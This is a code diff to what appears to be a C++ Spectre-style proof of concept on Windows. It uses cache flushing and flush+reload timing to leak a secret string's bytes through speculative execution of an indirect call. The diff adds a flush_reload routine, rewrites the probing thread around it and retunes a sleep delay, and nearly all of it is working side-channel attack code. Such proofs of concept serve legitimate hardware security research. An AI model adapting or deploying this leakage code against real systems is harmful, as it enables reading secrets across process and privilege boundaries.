@@ -11,6 +11,7 @@ extern "C" {
                     const void *probe_start);
 
   uint32_t memory_access(LPCBYTE);
+  uint32_t flush_reload(LPCBYTE);
 }
 
 const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
@@ -23,29 +24,18 @@ void (*Touch)(uint8_t*, uint8_t*) = nullptr;
 void do_nothing(uint8_t*, uint8_t*) {}
 
 DWORD WINAPI ProbingThread(LPVOID) {
-  for (;;) {
-    for (int trial = 0; ; ++trial) {
-      for (int i = 0; i < probe_lines; ++i)
-        _mm_clflush(&probe[i * 4096]);
-
-      // Delay the operation to give the victim thread time to speculatively
-      // execute a mispredicted branch.  Timing window is very tight.
-      // I tried Sleep or system calls as well, but the following simple loop
-      // gives relatively better success rate though it's still low.
-      for (volatile int z = 0; z < 1000000; ++z);
-
-      for (int i = 0; i < probe_lines; ++i)
-        tat[i] = memory_access(probe + i * 4096);
-
-      int idx_min = 0;
-      for (int i = 0; i < probe_lines; ++i)
-        if (tat[i] < tat[idx_min]) idx_min = i;
-      if (tat[idx_min] < 100) {
+  for (int i = 0; i < probe_lines; ++i)
+    _mm_clflush(&probe[i * 4096]);
+  for (int trial = 1; ; ++trial) {
+    for (int i = 0; i < probe_lines; ++i) {
+      auto t = flush_reload(probe + i * 4096);
+      if (t < 100) {
         printf("trial#%d: guess='%c' (=%02x) (score=%d)\n",
                trial,
-               static_cast<uint8_t>(idx_min),
-               static_cast<uint8_t>(idx_min),
-               static_cast<uint32_t>(tat[idx_min]));
+               static_cast<uint8_t>(i),
+               static_cast<uint8_t>(i),
+               static_cast<uint32_t>(t));
+        trial = 0;
         break;
       }
     }
@@ -77,13 +67,13 @@ void victim_thread(const void *target, bool do_probe) {
           _mm_clflush(&probe[i * 4096]);
       }
 
-      Sleep(1);
+      Sleep(100);
       IndirectCall(call_destination, target, probe);
 
       if (!do_probe) continue;
 
       for (int i = 0; i < probe_lines; ++i)
-        tat[i] = memory_access(probe + i * 4096);
+        tat[i] = flush_reload(probe + i * 4096);
 
       int idx_min = 0;
       for (int i = 0; i < probe_lines; ++i)
